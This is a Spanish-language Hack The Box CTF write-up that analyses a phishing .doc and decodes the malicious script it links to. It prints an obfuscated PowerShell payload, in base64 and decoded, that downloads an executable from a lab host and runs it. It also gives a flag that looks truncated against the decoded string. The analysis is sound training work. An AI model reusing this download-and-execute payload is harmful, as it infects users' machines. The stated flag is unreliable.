---
tags:
  - CTF
plataforma: Hack The Box
web: https://app.hackthebox.com/challenges/Diagnostic
dificultad: Media
autor: JSantos1113
---
> [!INFO] CHALLENGE DESCRIPTION
>  Our SOC has identified numerous phishing emails coming in claiming to have a document about an upcoming round of layoffs in the company. The emails all contain a link to diagnostic.htb/layoffs.doc. The DNS for that domain has since stopped resolving, but the server is still hosting the malicious document (your docker). Take a look and figure out what's going on.


> [!FAQ]- Pistas
> diagnostic.htb/layoffs.doc
> 


# Programas Utilizados

> [Oleid v0.60.1](https://github.com/decalage2/oletools) 
> [CyberChef v10.8.2](https://github.com/gchq/CyberChef)

# Hashes

> diagnostic.doc
> 	MD5: 179edc069f98c5fedc71e6fecdbc7678
> 	SHA1: d9309ee47854dd3c0cc1050f3c19d780c2c5177c
> 	SHA256: 53cda0a859ae9565aea4d8e862e56155e978ce19b99d8fd0f6c81c65c41ebab2
# Reconocimiento

> La información que podemos sacar a simple vista es ir a la siguiente url `diagnostic.htb/layoffs.doc` de la cual se nos descargará un archivo. A continuación, todos los pasos seguidos para poder llegar a resolver este challenge.

# Solución

> Para comenzar, al iniciar el challenge tenemos una IP junto a su correspondiente puerto.
> 
> ![[Pasted image 20240326110758.png]]
> Esta IP y puerto como nos han pedido que nos descarguemos un archivo y que el DNS no funciona, debemos añadir esta ip junto a su ruta en el archivo /etc/hosts.
> Ruta: `94.237.49.166    diagnostic.htb/layoffs.doc`
> 
> ![[Pasted image 20240326111042.png]]
> Una vez tengamos esto, ya tenemos resolución DNS con lo que podemos buscar la siguiente ip con el puerto y ruta en el navegador para poder descargar el archivo que posteriormente deberemos analizar.
> Ruta: `http://94.237.49.166:54876/layoffs.doc` 
> 
> ![[Pasted image 20240326111451.png]]
> Esto lo que hará es descargarnos un archivo llamado diagnostic.doc
> 
> ![[Pasted image 20240326111539.png]]
> Con este archivo lo primero que deberemos hacer es saber que archivo es ya que puede que no sea un archivo doc. Para saber eso utilizaremos el comando file junto al archivo.
> Comando: `file diagnostic.doc`
> ![[Pasted image 20240326111841.png]]
> Como este comando no nos da mucha información, utilizaré el programa oleid que intenta detectar si el archivo es un archivo OLE y proporciona información sobre su estructura y posibles características. El cual nos ayudará a detectar archivos Microsoft Office maliciosos o potencialmente peligrosos.
> A la hora de instalar el programa me ha dado un error el cual he solucionado con los siguientes comandos.
> 
```
dpkg -l | grep pyparsing
sudo apt remove python3-pyparsing
sudo rm -rf /usr/lib/python3/dist-packages/pyparsing*
sudo -H pip3 install -U oletools[full]
```
> Para utilizar esta herramienta simplemente debemos de introducir el siguiente comando.
> Comando: `oleid diagnostic.doc`
> ![[Pasted image 20240326113014.png]]
> Con esta tabla que nos ha generado, podemos ver que todo está en condiciones, menos lo rojo que nos indica que hay relaciones externas y el riesgo es alto. Para ver que es lo que ocurre, en la descripción nos indica que utilicemos el siguiente comando.
> Comando: `oleobj diagnostic.doc`
> ![[Pasted image 20240326113519.png]]
> Una vez ejecutado el comando, este nos reporta que tiene conexión con un link externo el cual es: `hxxp://diagnostic.htb:54876/223_index_style_fancy.html`
> Para saber de que trata esta url, la buscamos en el navegador.
> ![[Pasted image 20240326113719.png]]
> A simple vista esta no nos reporta nada. Con lo que se procederá a ver el código fuente de la misma con el atajo de teclado.
> Atajo: `Ctrl + U`
> ![[Pasted image 20240326113847.png]]
> Se puede ver que la página que aparentemente no tenía nada, en el backend contiene un script el cual ejecuta.
> Si nos desplazamos por el script de la página se puede ver todo lo que ejecuta.
> ![[Pasted image 20240326115354.png]]
> Este código lo copiaremos en un archivo para que sea más fácil de analizar.
> ![[Pasted image 20240326120436.png]]
> En esta parte se puede que esta en base64 lo que se se está ejecutando. Para descifrar eso y poder leerlo en texto plano. Utilizaré CyberChef la cual es una herramienta la cual permite convertir datos entre diferentes formatos. En este caso necesitaremos el formato Base64.
> Copiamos el código del script y lo pasamos por CyberChef con la receta From Base64.
> Código: `JHtmYGlsZX0gPSAoIns3fXsxfXs2fXs4fXs1fXszfXsyfXs0fXswfSItZid9LmV4ZScsJ0J7bXNEdF80c19BX3ByMCcsJ0UnLCdyLi4ucycsJzNNc19iNEQnLCdsMycsJ3RvQycsJ0hUJywnMGxfaDRuRCcpCiYoInsxfXsyfXswfXszfSItZid1ZXMnLCdJbnZva2UnLCctV2ViUmVxJywndCcpICgiezJ9ezh9ezB9ezR9ezZ9ezV9ezN9ezF9ezd9Ii1mICc6Ly9hdScsJy5odGIvMicsJ2gnLCdpYycsJ3RvJywnYWdub3N0JywnbWF0aW9uLmRpJywnL24uZXhlJywndHRwcycpIC1PdXRGaWxlICJDOlxXaW5kb3dzXFRhc2tzXCRmaWxlIgomKCgoIns1fXs2fXsyfXs4fXswfXszfXs3fXs0fXsxfSIgLWYnTDlGVGFza3NMOUYnLCdpbGUnLCdvdycsJ0wnLCdmJywnQzonLCdMOUZMOUZXaW5kJywnOUZrekgnLCdzTDlGJykpICAtQ1JlcGxBY2Una3pIJyxbY2hBcl0zNiAtQ1JlcGxBY2UoW2NoQXJdNzYrW2NoQXJdNTcrW2NoQXJdNzApLFtjaEFyXTkyKQo=`
> ![[Pasted image 20240326115912.png]]
> Lo que nos saca CyberChef es lo siguiente: 
> 
```
${f`ile} = ("{7}{1}{6}{8}{5}{3}{2}{4}{0}"-f'}.exe','B{msDt_4s_A_pr0','E','r...s','3Ms_b4D','l3','toC','HT','0l_h4nD')
&("{1}{2}{0}{3}"-f'ues','Invoke','-WebReq','t') ("{2}{8}{0}{4}{6}{5}{3}{1}{7}"-f '://au','.htb/2','h','ic','to','agnost','mation.di','/n.exe','ttps') -OutFile "C:\Windows\Tasks\$file"
&((("{5}{6}{2}{8}{0}{3}{7}{4}{1}" -f'L9FTasksL9F','ile','ow','L','f','C:','L9FL9FWind','9FkzH','sL9F'))  -CReplAce'kzH',[chAr]36 -CReplAce([chAr]76+[chAr]57+[chAr]70),[chAr]92)
```
> Esto ya está más legible y podemos analizarlo más a fondo, pero antes de ello, vamos a acabar de analizar el resto del script que está también en base64.
> Código: `Tm93IGZvciBhIGNoZWVyIHRoZXkgYXJlIGhlcmUsCnRyaXVtcGhhbnQhCkhlcmUgdGhleSBjb21lIHdpdGggYmFubmVycyBmbHlpbmcsCkluIHN0YWx3YXJ0IHN0ZXAgdGhleSdyZSBuaWdoaW5nLApXaXRoIHNob3V0cyBvZiB2aWN0J3J5IGNyeWluZywKV2UgaHVycmFoLCBodXJyYWgsIHdlIGdyZWV0IHlvdSBub3csCkhhaWwhCgpGYXIgd2UgdGhlaXIgcHJhaXNlcyBzaW5nCkZvciB0aGUgZ2xvcnkgYW5kIGZhbWUgdGhleSd2ZSBicm8ndCB1cwpMb3VkIGxldCB0aGUgYmVsbHMgdGhlbSByaW5nCkZvciBoZXJlIHRoZXkgY29tZSB3aXRoIGJhbm5lcnMgZmx5aW5nCkZhciB3ZSB0aGVpciBwcmFpc2VzIHRlbGwKRm9yIHRoZSBnbG9yeSBhbmQgZmFtZSB0aGV5J3ZlIGJybyd0IHVzCkxvdWQgbGV0IHRoZSBiZWxscyB0aGVtIHJpbmcKRm9yIGhlcmUgdGhleSBjb21lIHdpdGggYmFubmVycyBmbHlpbmcKSGVyZSB0aGV5IGNvbWUsIEh1cnJhaCEKCkhhaWwhIHRvIHRoZSB2aWN0b3JzIHZhbGlhbnQKSGFpbCEgdG8gdGhlIGNvbnF1J3JpbmcgaGVyb2VzCkhhaWwhIEhhaWwhIHRvIE1pY2hpZ2FuCnRoZSBsZWFkZXJzIGFuZCBiZXN0CkhhaWwhIHRvIHRoZSB2aWN0b3JzIHZhbGlhbnQKSGFpbCEgdG8gdGhlIGNvbnF1J3JpbmcgaGVyb2VzCkhhaWwhIEhhaWwhIHRvIE1pY2hpZ2FuLAp0aGUgY2hhbXBpb25zIG9mIHRoZSBXZXN0IQoKV2UgY2hlZXIgdGhlbSBhZ2FpbgpXZSBjaGVlciBhbmQgY2hlZXIgYWdhaW4KRm9yIE1pY2hpZ2FuLCB3ZSBjaGVlciBmb3IgTWljaGlnYW4KV2UgY2hlZXIgd2l0aCBtaWdodCBhbmQgbWFpbgpXZSBjaGVlciwgY2hlZXIsIGNoZWVyCldpdGggbWlnaHQgYW5kIG1haW4gd2UgY2hlZXIhCgoKSGFpbCEgdG8gdGhlIHZpY3RvcnMgdmFsaWFudApIYWlsISB0byB0aGUgY29ucXUncmluZyBoZXJvZXMKSGFpbCEgSGFpbCEgdG8gTWljaGlnYW4sCnRoZSBjaGFtcGlvbnMgb2YgdGhlIFdlc3Qh Ck5vdyBmb3IgYSBjaGVlciB0aGV5IGFyZSBoZXJlLAp0cml1bXBoYW50IQpIZXJlIHRoZXkgY29tZSB3aXRoIGJhbm5lcnMgZmx5aW5nLApJbiBzdGFsd2FydCBzdGVwIHRoZXkncmUgbmlnaGluZywKV2l0aCBzaG91dHMgb2YgdmljdCdyeSBjcnlpbmcsCldlIGh1cnJhaCwgaHVycmFoLCB3ZSBncmVldCB5b3Ugbm93LApIYWlsIQoKRmFyIHdlIHRoZWlyIHByYWlzZXMgc2luZwpGb3IgdGhlIGdsb3J5IGFuZCBmYW1lIHRoZXkndmUgYnJvJ3QgdXMKTG91ZCBsZXQgdGhlIGJlbGxzIHRoZW0gcmluZwpGb3IgaGVyZSB0aGV5IGNvbWUgd2l0aCBiYW5uZXJzIGZseWluZwpGYXIgd2UgdGhlaXIgcHJhaXNlcyB0ZWxsCkZvciB0aGUgZ2xvcnkgYW5kIGZhbWUgdGhleSd2ZSBicm8ndCB1cwpMb3VkIGxldCB0aGUgYmVsbHMgdGhlbSByaW5nCkZvciBoZXJlIHRoZXkgY29tZSB3aXRoIGJhbm5lcnMgZmx5aW5nCkhlcmUgdGhleSBjb21lLCBIdXJyYWghCgpIYWlsISB0byB0aGUgdmljdG9ycyB2YWxpYW50CkhhaWwhIHRvIHRoZSBjb25xdSdyaW5nIGhlcm9lcwpIYWlsISBIYWlsISB0byBNaWNoaWdhbgp0aGUgbGVhZGVycyBhbmQgYmVzdApIYWlsISB0byB0aGUgdmljdG9ycyB2YWxpYW50CkhhaWwhIHRvIHRoZSBjb25xdSdyaW5nIGhlcm9lcwpIYWlsISBIYWlsISB0byBNaWNoaWdhbiwKdGhlIGNoYW1waW9ucyBvZiB0aGUgV2VzdCEKCldlIGNoZWVyIHRoZW0gYWdhaW4KV2UgY2hlZXIgYW5kIGNoZWVyIGFnYWluCkZvciBNaWNoaWdhbiwgd2UgY2hlZXIgZm9yIE1pY2hpZ2FuCldlIGNoZWVyIHdpdGggbWlnaHQgYW5kIG1haW4KV2UgY2hlZXIsIGNoZWVyLCBjaGVlcgpXaXRoIG1pZ2h0IGFuZCBtYWluIHdlIGNoZWVyIQoKCkhhaWwhIHRvIHRoZSB2aWN0b3JzIHZhbGlhbnQKSGFpbCEgdG8gdGhlIGNvbnF1J3JpbmcgaGVyb2VzCkhhaWwhIEhhaWwhIHRvIE1pY2hpZ2FuLAp0aGUgY2hhbXBpb25zIG9mIHRoZSBXZXN0IQ== CgpOb3cgZm9yIGEgY2hlZXIgdGhleSBhcmUgaGVyZSwKdHJpdW1waGFudCEKSGVyZSB0aGV5IGNvbWUgd2l0aCBiYW5uZXJzIGZseWluZywKSW4gc3RhbHdhcnQgc3RlcCB0aGV5J3JlIG5pZ2hpbmcsCldpdGggc2hvdXRzIG9mIHZpY3QncnkgY3J5aW5nLApXZSBodXJyYWgsIGh1cnJhaCwgd2UgZ3JlZXQgeW91IG5vdywKSGFpbCEKCkZhciB3ZSB0aGVpciBwcmFpc2VzIHNpbmcKRm9yIHRoZSBnbG9yeSBhbmQgZmFtZSB0aGV5J3ZlIGJybyd0IHVzCkxvdWQgbGV0IHRoZSBiZWxscyB0aGVtIHJpbmcKRm9yIGhlcmUgdGhleSBjb21lIHdpdGggYmFubmVycyBmbHlpbmcKRmFyIHdlIHRoZWlyIHByYWlzZXMgdGVsbApGb3IgdGhlIGdsb3J5IGFuZCBmYW1lIHRoZXkndmUgYnJvJ3QgdXMKTG91ZCBsZXQgdGhlIGJlbGxzIHRoZW0gcmluZwpGb3IgaGVyZSB0aGV5IGNvbWUgd2l0aCBiYW5uZXJzIGZseWluZwpIZXJlIHRoZXkgY29tZSwgSHVycmFoIQoKSGFpbCEgdG8gdGhlIHZpY3RvcnMgdmFsaWFudApIYWlsISB0byB0aGUgY29ucXUncmluZyBoZXJvZXMKSGFpbCEgSGFpbCEgdG8gTWljaGlnYW4KdGhlIGxlYWRlcnMgYW5kIGJlc3QKSGFpbCEgdG8gdGhlIHZpY3RvcnMgdmFsaWFudApIYWlsISB0byB0aGUgY29ucXUncmluZyBoZXJvZXMKSGFpbCEgSGFpbCEgdG8gTWljaGlnYW4sCnRoZSBjaGFtcGlvbnMgb2YgdGhlIFdlc3QhCgpXZSBjaGVlciB0aGVtIGFnYWluCldlIGNoZWVyIGFuZCBjaGVlciBhZ2FpbgpGb3IgTWljaGlnYW4sIHdlIGNoZWVyIGZvciBNaWNoaWdhbgpXZSBjaGVlciB3aXRoIG1pZ2h0IGFuZCBtYWluCldlIGNoZWVyLCBjaGVlciwgY2hlZXIKV2l0aCBtaWdodCBhbmQgbWFpbiB3ZSBjaGVlciEKCgpIYWlsISB0byB0aGUgdmljdG9ycyB2YWxpYW50CkhhaWwhIHRvIHRoZSBjb25xdSdyaW5nIGhlcm9lcwpIYWlsISBIYWlsISB0byBNaWNoaWdhbiwKdGhlIGNoYW1waW9ucyBvZiB0aGUgV2VzdCE= SGFyayB0aGUgc291bmQgb2YgVGFyIEhlZWwgdm9pY2VzClJpbmdpbmcgY2xlYXIgYW5kIFRydWUKU2luZ2luZyBDYXJvbGluYSdzIHByYWlzZXMKU2hvdXRpbmcgTi5DLlUuCgpIYWlsIHRvIHRoZSBicmlnaHRlc3QgU3RhciBvZiBhbGwKQ2xlYXIgaXRzIHJhZGlhbmNlIHNoaW5lCkNhcm9saW5hIHByaWNlbGVzcyBnZW0sClJlY2VpdmUgYWxsIHByYWlzZXMgdGhpbmUuCgpOZWF0aCB0aGUgb2FrcyB0aHkgc29ucyBhbmQgZGF1Z2h0ZXJzCkhvbWFnZSBwYXkgdG8gdGhlZQpUaW1lIHdvcm4gd2FsbHMgZ2l2ZSBiYWNrIHRoZWlyIGVjaG8KSGFpbCB0byBVLk4uQy4KClRob3VnaCB0aGUgc3Rvcm1zIG9mIGxpZmUgYXNzYWlsIHVzClN0aWxsIG91ciBoZWFydHMgYmVhdCB0cnVlCk5hdWdodCBjYW4gYnJlYWsgdGhlIGZyaWVuZHNoaXBzIGZvcm1lZCBhdApEZWFyIG9sZCBOLkMuVS4= CkhhcmsgdGhlIHNvdW5kIG9mIFRhciBIZWVsIHZvaWNlcwpSaW5naW5nIGNsZWFyIGFuZCBUcnVlClNpbmdpbmcgQ2Fyb2xpbmEncyBwcmFpc2VzClNob3V0aW5nIE4uQy5VLgoKSGFpbCB0byB0aGUgYnJpZ2h0ZXN0IFN0YXIgb2YgYWxsCkNsZWFyIGl0cyByYWRpYW5jZSBzaGluZQpDYXJvbGluYSBwcmljZWxlc3MgZ2VtLApSZWNlaXZlIGFsbCBwcmFpc2VzIHRoaW5lLgoKTmVhdGggdGhlIG9ha3MgdGh5IHNvbnMgYW5kIGRhdWdodGVycwpIb21hZ2UgcGF5IHRvIHRoZWUKVGltZSB3b3JuIHdhbGxzIGdpdmUgYmFjayB0aGVpciBlY2hvCkhhaWwgdG8gVS5OLkMuCgpUaG91Z2ggdGhlIHN0b3JtcyBvZiBsaWZlIGFzc2FpbCB1cwpTdGlsbCBvdXIgaGVhcnRzIGJlYXQgdHJ1ZQpOYXVnaHQgY2FuIGJyZWFrIHRoZSBmcmllbmRzaGlwcyBmb3JtZWQgYXQKRGVhciBvbGQgTi5DLlUu`
> Analizamos esto con CyberChef con la receta From Base64.
> ![[Pasted image 20240326120735.png]]
> Lo que nos saca CyberChef es mucho texto el cual trata de el "Himno de la Universidad de Michigan" y de el "Himno de la Universidad de Carolina del Norte en Chapel Hill"
> Con lo que este texto no nos proporciona nada interesante.
> Volvemos con el código anteriormente proporcionado por CyberChef. Lo que hace este script es descargar un archivo ejecutable desde una URL remota y lo guarda en el sistema local en una ubicación específica dentro de la carpeta de tareas de Windows.
> Ahora de ese código vamos a ver solamente de que archivo .exe se trata. El código es código de Powershell con lo que deberemos ejecutarlo ahí.
> Código a ejecutar: 
> 
```
$file = ("{7}{1}{6}{8}{5}{3}{2}{4}{0}"-f'}.exe','B{msDt_4s_A_pr0','E','r...s','3Ms_b4D','l3','toC','HT','0l_h4nD')
```

> Esto lo que hará es ordenar esto: msDt_4s_A_pr0','E','r...s','3Ms_b4D','l3','toC','HT','0l_h4nD' según el siguiente orden: {7}{1}{6}{8}{5}{3}{2}{4}{0}. Posteriormente como se ha definido previamente una variable llamada $file, deberemos llamarla para ver que es lo que ha generado.
> Procedemos a ejecutarlo en Powershell y nos sale lo siguiente.
> ![[Pasted image 20240326122604.png]]
> Para finalizar esto lo que nos genera es la flag.
> 

# Bandera(s)

> [!FLAG] `HTB{msDt_4s}`

